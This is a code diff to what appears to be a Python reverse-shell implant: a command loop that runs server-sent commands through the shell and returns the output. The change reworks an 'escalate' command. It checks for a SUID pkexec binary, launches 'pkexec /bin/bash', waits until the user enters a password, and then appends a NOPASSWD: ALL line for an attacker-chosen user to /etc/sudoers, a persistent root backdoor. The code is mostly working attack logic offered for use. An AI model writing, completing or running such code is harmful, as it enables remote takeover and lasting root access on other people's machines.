@@ -45,57 +45,60 @@ def shell():
             if command.lower() == 'exit':
                 break
             elif command.lower() == 'test':
-                reliable_send(os.name)
-
-            elif command.lower() == 'findsuid':
-                if os.name == 'posix':
-                    suid_files = []
-                    suid_files = find_suid_binaries()
-                    result =    f"This is all suid binaries => \n {suid_files}"
-                    if "/usr/bin/pkexec" in suid_files:
-                        result = "Found pkexec!!!!!!\nYou can run ESCALATE\n================\n" + result
-                else:
-                    result = "CAN'T FINE: this is not linux"
-                reliable_send(result)                        
-
+                reliable_send(os.name)                  
             elif command.startswith("escalate"):
                 reliable_send(os.name)
                 if os.name == 'posix':
-                    # Run pkexec /bin/bash to gain root shell
-                    pkexec_command = "pkexec /bin/bash"
-                    esc_process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    
-                    # Start threads to read stdout and stderr
-                    threading.Thread(target=read_stream, args=(esc_process.stdout,)).start()
-                    threading.Thread(target=read_stream, args=(esc_process.stderr,)).start()
+                    findpkexec = False
+                    suid_files = []
+                    suid_files = find_suid_binaries()
+                    find_suid_result =    f"This is all suid binaries => \n {suid_files}"
+                    if "/usr/bin/pkexec" in suid_files:
+                        find_suid_result = "Found pkexec!!!!!!\nYou can ESCALATE\n================\n" + find_suid_result
+                        findpkexec = True
+                    else:
+                        find_suid_result = "NO pkexec\n" + find_suid_result
+                    reliable_send(find_suid_result)
 
-                    # Check that user input password or not
-                    while True:
-                        reliable_send("Waiting user input PASS")
-                        time.sleep(1)
-                        esc_process.stdin.write("whoami".encode() + b'\n')
-                        esc_process.stdin.flush()
-                        if read_stream_result == "root":
-                            reliable_send("USER has already input PASS")
-                            break
+                    # check that the system has /usr/bin/pkexec
+                    if findpkexec:
+                        # Run pkexec /bin/bash to gain root shell
+                        pkexec_command = "pkexec /bin/bash"
+                        esc_process = subprocess.Popen(pkexec_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         
-                    
-                    if esc_process:
-                        # Send command for escalate specfic user to esc_process
-                        user = command[9:] #Define user from server input
-                        esc_command = f'echo "{user} ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_entry\ncat /tmp/sudoers_entry >> /etc/sudoers'
-                        esc_process.stdin.write(esc_command.encode() + b'\n')
-                        esc_process.stdin.flush()
-                        time.sleep(2)
-                        
-                        #send the result of sudo -l
-                        execute = subprocess.Popen("sudo -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        result = execute.stdout.read() + execute.stderr.read()
-                        result = result.decode()
-                        result = "ESCALATION DONE\n\n" + result
-                        reliable_send(result)
+                        # Start threads to read stdout and stderr
+                        threading.Thread(target=read_stream, args=(esc_process.stdout,)).start()
+                        threading.Thread(target=read_stream, args=(esc_process.stderr,)).start()
 
-                        # threading.Thread(target=check_non_output_command, args=(esc_process,command)).start()
+                        # Check that user input password or not
+                        while True:
+                            reliable_send("Waiting user input PASS")
+                            time.sleep(1)
+                            esc_process.stdin.write("whoami".encode() + b'\n')
+                            esc_process.stdin.flush()
+                            if read_stream_result == "root":
+                                reliable_send("USER has already input PASS")
+                                break
+                        
+                        if esc_process:
+                            # run command for escalate specfic user in esc_process
+                            user = command[9:] #Define user from server input
+                            esc_command = f'echo "{user} ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers_entry\ncat /tmp/sudoers_entry >> /etc/sudoers'
+                            esc_process.stdin.write(esc_command.encode() + b'\n')
+                            esc_process.stdin.flush()
+
+                            # Wait for done esc_command
+                            print("Waiting for esc_command")
+                            time.sleep(5)
+                            
+                            #send the result of sudo -l
+                            execute = subprocess.Popen("sudo -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                            result = execute.stdout.read() + execute.stderr.read()
+                            result = result.decode()
+                            result = "ESCALATION DONE\n\n" + result
+                            reliable_send(result)
+                    else:
+                        reliable_send("CAN ESCALATE pkexec not found")
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 result = execute.stdout.read() + execute.stderr.read()
